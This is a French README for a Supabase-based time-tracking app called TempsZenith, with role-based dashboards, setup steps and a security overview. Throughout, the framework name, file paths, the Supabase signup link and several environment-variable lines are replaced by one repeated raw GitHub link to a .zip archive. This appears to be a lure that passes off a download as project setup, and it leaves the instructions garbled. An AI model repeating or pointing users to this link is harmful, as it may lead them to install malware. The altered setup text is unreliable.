# TempsZenith - Application de Suivi du Temps

Une application moderne de suivi du temps avec gestion des rôles (administrateur, employé, client) construite avec https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip et Supabase.

## 🚀 Fonctionnalités

### Authentification et Autorisation
- **Inscription/Connexion sécurisée** avec Supabase Auth
- **Gestion des rôles** : Administrateur, Employé, Client
- **Protection des routes** basée sur les rôles
- **Middleware https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip** pour la sécurité

### Tableaux de Bord Spécialisés
- **Administrateur** : Vue d'ensemble complète, gestion des utilisateurs, rapports globaux
- **Employé** : Suivi du temps personnel, gestion des projets, timer intégré
- **Client** : Suivi des projets, rapports, facturation

### Suivi du Temps
- Timer en temps réel avec start/pause/stop
- Gestion des projets et descriptions
- Historique complet des entrées de temps
- Rapports et statistiques

## 🛠️ Technologies Utilisées

- **Frontend** : https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip 14, React, TypeScript, Tailwind CSS
- **Backend** : Supabase (PostgreSQL, Auth, RLS)
- **Authentification** : Supabase Auth avec helpers https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
- **Validation** : Zod + React Hook Form
- **Icons** : Lucide React
- **Styling** : Tailwind CSS avec design system

## 📦 Installation

1. **Cloner le projet**
```bash
git clone <votre-repo>
cd tempszenith
```

2. **Installer les dépendances**
```bash
npm install
```

3. **Configuration Supabase**
   - Créez un projet sur [Supabase](https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip)
   - Copiez `https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip` vers `https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip`
   - Remplissez les variables d'environnement :

```env
https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
NEXT_PUBLIC_SUPABASE_ANON_KEY=votre_clé_anonyme
SUPABASE_SERVICE_ROLE_KEY=votre_clé_service_role
JWT_SECRET=votre_secret_jwt
NEXT_PUBLIC_APP_URL=http://localhost:3000
```

4. **Configurer la base de données**
   - Exécutez le script SQL dans `https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip`
   - Ou utilisez la CLI Supabase :
```bash
npx supabase db reset
```

5. **Lancer l'application**
```bash
npm run dev
```

L'application sera disponible sur [http://localhost:3000](http://localhost:3000)

## 🗂️ Structure du Projet

```
src/
├── app/                    # App Router https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
│   ├── admin/             # Pages administrateur
│   ├── employee/          # Pages employé
│   ├── client/            # Pages client
│   ├── auth/              # Pages d'authentification
│   └── https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip         # Layout principal
├── components/
│   └── ui/                # Composants UI réutilisables
├── hooks/                 # Hooks React personnalisés
├── lib/
│   ├── auth/              # Services d'authentification
│   └── supabase/          # Configuration Supabase
├── types/                 # Types TypeScript
└── https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip          # Middleware https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
```

## 🔐 Sécurité

### Row Level Security (RLS)
- **Politiques granulaires** pour chaque table
- **Isolation des données** par utilisateur et rôle
- **Protection automatique** des API Supabase

### Middleware de Protection
- **Vérification des sessions** sur chaque requête
- **Redirection automatique** selon les rôles
- **Protection des routes sensibles**

### Gestion des Tokens
- **Cookies HTTP-only** pour les tokens sensibles
- **Refresh automatique** des sessions
- **Déconnexion sécurisée**

## 👥 Rôles et Permissions

### Administrateur
- ✅ Accès complet à toutes les fonctionnalités
- ✅ Gestion des utilisateurs
- ✅ Rapports globaux
- ✅ Configuration système

### Employé
- ✅ Suivi du temps personnel
- ✅ Gestion des projets assignés
- ✅ Rapports individuels
- ❌ Gestion des autres utilisateurs

### Client
- ✅ Consultation des rapports de projets
- ✅ Suivi de l'avancement
- ✅ Facturation
- ❌ Accès aux données internes

## 🚀 Déploiement

### Vercel (Recommandé)
1. Connectez votre repository à Vercel
2. Configurez les variables d'environnement
3. Déployez automatiquement

### Variables d'Environnement de Production
```env
https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
NEXT_PUBLIC_SUPABASE_ANON_KEY=votre_clé_anonyme_prod
SUPABASE_SERVICE_ROLE_KEY=votre_clé_service_role_prod
JWT_SECRET=votre_secret_jwt_prod
https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
```

## 🧪 Tests

```bash
# Tests unitaires
npm run test

# Tests e2e
npm run test:e2e

# Coverage
npm run test:coverage
```

## 📝 Scripts Disponibles

```bash
npm run dev          # Développement
npm run build        # Build de production
npm run start        # Serveur de production
npm run lint         # Linting
npm run type-check   # Vérification TypeScript
```

## 🤝 Contribution

1. Fork le projet
2. Créez une branche feature (`git checkout -b feature/nouvelle-fonctionnalite`)
3. Committez vos changements (`git commit -m 'Ajout nouvelle fonctionnalité'`)
4. Push vers la branche (`git push origin feature/nouvelle-fonctionnalite`)
5. Ouvrez une Pull Request

## 📄 Licence

Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.

## 🆘 Support

Pour toute question ou problème :
- Ouvrez une issue sur GitHub
- Consultez la documentation Supabase
- Vérifiez les logs de développement

---

**TempsZenith** - Simplifiez la gestion du temps de vos équipes 🕐